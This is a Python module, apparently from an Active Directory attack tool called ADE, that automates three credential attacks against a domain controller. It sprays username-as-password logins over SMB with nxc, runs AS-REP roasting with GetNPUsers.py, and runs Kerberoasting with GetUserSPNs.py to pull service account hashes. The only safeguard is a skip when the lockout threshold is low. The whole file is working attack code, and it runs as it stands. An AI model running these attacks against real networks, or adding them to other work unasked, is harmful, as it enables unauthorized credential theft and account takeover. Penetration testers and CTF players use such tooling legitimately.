#!/usr/bin/env python3
"""
Attack modules for ADE - password spraying, AS-REP roasting, Kerberoasting.
"""

import subprocess
import os
import re
from termcolor import colored

from .config import SECTION_ART, USERS_FILE
from .utils import print_status, print_header, run_command
from .policy import get_password_policy, line_matches


def try_user_file(
    file_path: str,
    target: str,
    note: str = "Try user:user",
    timeout: int = 30,
    policy: dict = None
) -> None:
    """
    Perform user:user password spray attack using usernames from a file.
    
    Args:
        file_path: Path to file containing usernames (one per line)
        target: Target IP address
        note: Description of the spray attempt (for logging)
        timeout: Timeout in seconds for each authentication attempt
        policy: Password policy dict from get_password_policy() (optional)
                If provided and lockout_threshold <= 3, spraying is skipped for safety
    
    Behavior:
        - Checks password policy for dangerous lockout thresholds
        - Skips spraying if lockout threshold is 3 or less
        - Reads usernames from file_path
        - Attempts authentication with username:username for each user
        - Prints only lines matching success/failure patterns
        - Silently skips empty lines
    
    Output patterns matched:
        [+], [-], [!], STATUS_*, Authenticated, Connection Error
    
    Example output:
        [*] Starting Try user:user (Checking users.txt)...
        $ nxc smb 10.10.10.161 -u <user> -p <user> --continue-on-success
        [-] CORP\\Guest:Guest STATUS_LOGON_FAILURE
        [+] CORP\\admin:admin Authenticated!
    """
    if not os.path.exists(file_path):
        print_status(f"\n\n[INFO] Username file '{file_path}' not found; skipping {note}.")
        return

    # Check if spraying is safe based on password policy
    if policy is not None:
        lockout_threshold = policy.get("lockout_threshold")
        if lockout_threshold is not None and lockout_threshold > 0 and lockout_threshold <= 3:
            print_status(colored(f"\n[!!!] SKIPPING password spray due to dangerous lockout threshold ({lockout_threshold})!", "red"))
            print_status(colored("[!!!] Risk of locking out user accounts is too high.", "red"))
            print_status(colored("[!!!] To force spraying, run the script with --force-spray (not implemented yet).", "yellow"))
            return

    print_status(f"\n\n[*] Starting {note} (Checking {file_path})...")
    print(colored(f"$ nxc smb {target} -u <user> -p <user> --continue-on-success", "white"))

    with open(file_path, "r", encoding="utf-8") as fh:
        for raw in fh:
            user = raw.strip()
            if not user:
                continue

            cmd = ["nxc", "smb", target, "-u", user, "-p", user, "--continue-on-success"]
            try:
                proc = subprocess.run(
                    cmd,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    text=True,
                    timeout=timeout,
                )
                output = proc.stdout or ""
            except subprocess.TimeoutExpired:
                print_status(f"[-] {user}:{user} -> timeout after {timeout}s")
                continue
            except Exception as e:
                print_status(f"[-] {user}:{user} -> exception: {e}")
                continue

            # print any line that matches our patterns (print the line exactly)
            for line in output.splitlines():
                if line and line_matches(line):
                    print_status(line)

    print_status("\n[+] User:user spray finished.")


def user_spraying(
    r: str,
    d: str,
    u: str = None,
    p: str = None,
    k: bool = False,
    cred_status: str = None
) -> None:
    """
    Perform AS-REP roasting and user:user password spraying.
    
    Args:
        r: Target IP address
        d: Domain name (e.g., CORP.LOCAL)
        u: Username (None if no credentials provided)
        p: Password (None if no credentials provided)
        k: Boolean indicating if Kerberos authentication is enabled
        cred_status: Credential validation status from verify_credentials()
                    Values: "no-creds", "ok", "kerberos", "bad", "ambiguous"
    
    Behavior:
        With credentials:
            - Skips if cred_status == "bad"
            - Runs AS-REP roasting with GetNPUsers.py
            - Returns without password spraying (authenticated mode)
        
        Without credentials:
            - Runs AS-REP roasting to find users with pre-auth disabled
            - Attempts user:user password spray using users.txt
    
    Requirements:
        - users.txt must exist for AS-REP roasting
        - Domain must be discovered for GetNPUsers.py
    """
    print_header(SECTION_ART["user_spraying"])

    # If creds provided, use the cred_status passed from main()
    if u and p:
        if cred_status is None:
            # fallback if main didn't verify: run lightweight verification (existing behavior)
            verify_cmd = ["nxc", "smb", r, "-u", u, "-p", p, "--shares"]
            out, _ = run_command(verify_cmd, "Verify provided credentials (light SMB check)", capture_output=True)
            if out and re.search(r'STATUS_LOGON_FAILURE', out, re.IGNORECASE):
                print_status(colored("\n[-] Provided credentials appear invalid (STATUS_LOGON_FAILURE).", "red"))
                print_status(colored("[-] Skipping GetNPUsers.py and Kerberos AS-REP checks due to invalid credentials.", "red"))
                return
            if out and re.search(r'\[\+\]|Authenticated', out, re.IGNORECASE):
                cred_status = "ok"
            else:
                cred_status = "ambiguous"

        # Now react to the known cred_status (do not re-run the check)
        if cred_status == "bad":
            print_status(colored("\n[-] Provided credentials invalid — skipping AS-REP checks.", "red"))
            return
        elif cred_status in ("ok", "kerberos", "ambiguous"):
            # Proceed with AS-REP checks
            if os.path.exists(USERS_FILE):
                # Check if the script is in Kerberos mode
                if k:
                    # If so, add the -k flag to the command
                    cmd_str = f"GetNPUsers.py {d}/ -no-pass -k -usersfile {USERS_FILE} -dc-ip {r} | grep -v 'KDC_ERR_C_PRINCIPAL_UNKNOWN'"
                    run_command(cmd_str, "Find users with Kerberos pre-auth disabled", is_shell_command=True)
                else:
                    # Otherwise, run the standard command without -k
                    cmd_str = f"GetNPUsers.py {d}/ -no-pass -usersfile {USERS_FILE} -dc-ip {r} | grep -v 'KDC_ERR_C_PRINCIPAL_UNKNOWN'"
                    run_command(cmd_str, "Find users with Kerberos pre-auth disabled", is_shell_command=True)
            else:
                print_status(f"\n[INFO] '{USERS_FILE}' not found — skipping AS-REP Roasting.")
            
            return

    # No creds -> proceed with spraying (but only if users.txt exists)
    if not os.path.exists(USERS_FILE):
        print_status(f"\n[INFO] Username file '{USERS_FILE}' not present — cannot spray.")
        return

    # Run AS-REP roast check with GetNPUsers.py (preserve existing behavior)
    cmd_str = f"GetNPUsers.py {d}/ -no-pass -usersfile {USERS_FILE} -dc-ip {r} | grep -v 'KDC_ERR_C_PRINCIPAL_UNKNOWN'"
    run_command(cmd_str, "Find users with Kerberos pre-auth disabled", is_shell_command=True)

    # Get password policy before spraying to check lockout thresholds
    policy = get_password_policy(r, u, p, k)

    # Try users in users.txt (will check policy for safety)
    try_user_file(USERS_FILE, r, note="Attempt user:user", policy=policy)


def kerberoasting(r: str, f: str, d: str, u: str, p: str, k: bool) -> bool:
    """
    Attempt Kerberoasting attack to extract service account hashes.
    
    Args:
        r: Target IP address
        f: Fully qualified domain name of DC
        d: Domain name
        u: Username
        p: Password
        k: Boolean indicating if Kerberos authentication is enabled
    
    Returns:
        bool: True if NTLM negotiation failed and Kerberos rerun is needed, False otherwise
    
    Behavior:
        - Uses GetUserSPNs.py to request TGS tickets for service accounts
        - Detects if NTLM is disabled (Kerberos-only environment)
        - Triggers script restart with Kerberos if NTLM fails
    
    Output:
        - Service account hashes (if successful)
        - Kerberos requirement detection (if NTLM fails)
    """
    print_header(SECTION_ART["kerberoasting"])

    kerberos_auth = ["-k"] if k else []
    dc_host_name = f

    base_cmd = ["GetUserSPNs.py", f"{d}/{u}:{p}", "-request", "-dc-host", dc_host_name] + kerberos_auth

    # Run the command and capture ALL output (stdout + stderr)
    output, _ = run_command(base_cmd, "Request TGS for service accounts", capture_output=True)

    NTLM_FAILED = "NTLM negotiation failed"
    INVALID_CREDENTIALS = "invalidCredentials"

    if output and (NTLM_FAILED in output or INVALID_CREDENTIALS in output):
        if not k:
            print_status("\n[!] KERBEROS RERUN DETECTED: NTLM negotiation failed.")
            print_status("      Switching entire script to Kerberos authentication for second pass.")
            return True
    return False
